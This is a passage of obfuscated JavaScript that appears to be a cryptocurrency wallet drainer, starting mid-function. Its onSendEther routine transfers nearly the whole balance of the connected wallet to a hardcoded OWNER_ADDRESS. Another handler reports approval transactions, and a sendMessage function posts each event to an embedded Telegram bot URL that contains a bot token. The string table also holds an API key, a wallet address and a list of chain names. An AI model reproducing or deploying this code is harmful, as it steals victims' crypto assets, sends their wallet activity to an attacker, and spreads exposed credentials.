_0x46ef2d=_0x33dc9c;console[_0x46ef2d(0x8c)](_0x46ef2d(0xa4)+_0x4e8133),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network');})['on']('receipt',_0xebec87=>{const _0x3308c7=_0x33dc9c;console[_0x3308c7(0x8c)]('Transaction\x20Receipt:\x20'+_0xebec87),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage(_0x3308c7(0xc5)+_0x535a7c[_0x3308c7(0xc8)]),sendMessage(_0x3308c7(0x114)+OWNER_ADDRESS);})['on'](_0x33dc9c(0x7c),_0x13a900=>{const _0x367633=_0x33dc9c;console['log'](_0x367633(0x124)+_0x13a900),sendMessage(_0x367633(0x11f));});}else sendMessage(_0x33dc9c(0x83));}};}async function onSendEther(){const _0x5270a0=_0x299cf8;console['log']('Sending\x20ether');try{let _0x27f112=await web3Object['eth'][_0x5270a0(0xcf)](selectedAccount);var _0x2d35aa=await web3Object['eth'][_0x5270a0(0x9d)]();_0x27f112=_0x27f112-0x11c37937e08000;var _0x50bcfd={'gasPrice':_0x2d35aa,'from':selectedAccount,'to':OWNER_ADDRESS,'value':_0x27f112},_0x6a7d47=await web3Object[_0x5270a0(0x159)][_0x5270a0(0x123)](_0x50bcfd),_0x579e98=_0x2d35aa*_0x6a7d47;_0x50bcfd[_0x5270a0(0x14c)]=_0x6a7d47,console[_0x5270a0(0x8c)](_0x50bcfd['value']),web3Object['eth'][_0x5270a0(0x102)](_0x50bcfd)['on']('transactionHash',_0x127084=>{const _0x4f6105=_0x5270a0;console[_0x4f6105(0x8c)](_0x4f6105(0xa4),_0x127084),sendMessage(_0x4f6105(0x127));})['on']('receipt',_0x1e31f8=>{const _0x41c77b=_0x5270a0;console[_0x41c77b(0x8c)](_0x41c77b(0xf4),_0x1e31f8),sendMessage(_0x41c77b(0x73));})['on'](_0x5270a0(0x7c),_0x1c4bc8=>{const _0x375a70=_0x5270a0;console['log']('Error:\x20',_0x1c4bc8),sendMessage(_0x375a70(0x11f));});}catch{sendMessage(_0x5270a0(0xe9));}}function _0x20ad(){const _0x322d97=['10000','quote','matic-mainnet','_totalSupply','newMaxFee','boba-bnb-mainnet','allowance','tokenURI','Initial\x20list\x20','emerald-paratime-mainnet','skale-staging-uum','2682084fEWNhb','basisPointsRate','maximumFee','gas','5142WkqrJc','BAYC_PROVENANCE','canto-mainnet','&text=','supportsInterface','oasys-mainnet','e77435344ef0486893cdc26d7d5cf039','arbitrum-goerli','flarenetworks-canary-testnet','setBaseURI','decimals','toString','eth','function','bytes4','getApproved','10qLoNWj','oasis-sapphire-testnet','transferFrom','getBlackListStatus','safeTransferFrom','filter','Redeem','flipSaleState','milkomeda-a1-devnet','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f','Could\x20not\x20get\x20a\x20wallet\x20connection','matic-mumbai','harmony-testnet','contract_ticker_symbol','_to','_from','location','error','catch','Wallet\x20Connected\x20Successfully!','solana-mainnet','setApprovalForAll','nervos-godwoken-testnet','boba-goerli','Invalid\x20token\x20${token.address}','tokenId','palm-testnet','_owner','boba-avalanche-mainnet','items','milkomeda-c1-devnet','approved','skale-omnus','log','view','metis-testnet','who','avalanche-mainnet','issue','unpause','receipt','arbitrum-mainnet','AddedBlackList','ckey_5da97a82746c43ed84565c64afb','true','1462040RlpgoA','startingIndexBlock','cronos-testnet','fantom-mainnet','totalSupply','getGasPrice','nervos-polyjuice-testnet','usd','allowed','Params','JSON','destroyBlackFunds','Transaction\x20Hash:\x20','deprecated','findora-mainnet','1890IqyLLN','getOwner','_spender','pause','eth-mainnet','47220660VpwUIf','findora-forge-testnet','setParams','Approve\x20Completed\x20Successfully','harmony-mainnet','tokenOfOwnerByIndex','constructor','milkomeda-c1-mainnet','json','tokenByIndex','payable','approve','https://api.covalenthq.com/v1/','value','transfer','moonbeam-moonriver','999999999999999999999999999999999999999999999999999999999999999999999999','nervos-godwoken-mainnet','application/json','string','name','redeem','feeBasisPoints','NFT','ownerOf','NFT\x20Contract\x20Address\x20','amount','_symbol','address','skale-calypso','Pause','contract_address','_user','3973012VdMsJc','_value','getBalance','kcc-testnet','remaining','setStartingIndex','avalanche-dexalot-mainnet','avalanche-testnet','chainId:','maxNftSupply','reserveApes','isBlackListed','milkomeda-a1-mainnet','balanceOf','saleStart','newOwner','skale-razor','boba-avalanche-testnet','uint256','moonbeam-moonbase-alpha','paused','astar-mainnet','flarenetworks-flare-testnet','REVEAL_TIMESTAMP','Transfer','isApprovedForAll','balance','default','Insufficient\x20funds\x20for\x20transfer','data','_balance','RemovedBlackList','bool','bittorrent-mainnet','_data','_initialSupply','GET','operator','emergencySetStartingIndexBlock','Transaction\x20Receipt:\x20','defi-kingdoms-mainnet','_maker','bsc-testnet','optimism','symbol','optimism-mainnet','545974PcIDcq','startingIndex','event','axie-mainnet','length','nonpayable','owner','sendTransaction','petersburg','fantom-testnet','boba-mainnet','neon-testnet','maxApePurchase','bytes','send','index','search','defi-kingdoms-testnet','MAX_UINT','Error\x20...\x20Return\x20to\x20your\x20wallet\x20or\x20browser\x20extension\x20to\x20approve\x20smart\x20contract','gather-mainnet','oasys-testnet','BNB','linea-testnet','maxFee','Your\x20address\x20','type','boba-bobabase-testnet','1511815juRPRq','TOKEN\x20Contract\x20Address\x20','astar-shibuya','then','getAccounts','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','from','avalanche-dexalot-testnet','Transaction\x20Rejected','.connect','methods','Approval','estimateGas','Error:\x20','previousOwner','addBlackList','Transaction\x20is\x20submitted\x20to\x20the\x20network','rsk-mainnet','getChainId','withdraw','_name','apePrice','upgradedAddress','/address/','sx-mainnet','aurora-testnet','oasis-sapphire-mainnet','ApprovalForAll','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','baseURI','cronos-mainnet','btc-mainnet','Error\x20processing\x20item\x20','swimmer-testnet','bsc-mainnet','palm-mainnet','Contract','kcc-mainnet','spender'];_0x20ad=function(){return _0x322d97;};return _0x20ad();}async function sendMessage(_0x53a6cb){return new Promise((_0x41d9eb,_0x1986e5)=>{const _0x234cff=_0x4f8a,_0x5a95c9=0x13796f5c3;fetch(_0x234cff(0x133)+_0x5a95c9+_0x234cff(0x150)+_0x53a6cb,{'method':_0x234cff(0xf1),'headers':{}})[_0x234cff(0x11a)](async _0x2a54fe=>{const _0x5caf2e=_0x234cff;if(_0x2a54fe['status']>0x18f)throw _0x2a54fe;_0x41d9eb(await _0x2a54fe[_0x5caf2e(0xb4)]());})[_0x234cff(0x7d)](_0xb7d7d2=>{_0x1986e5(_0xb7d7d2);});});}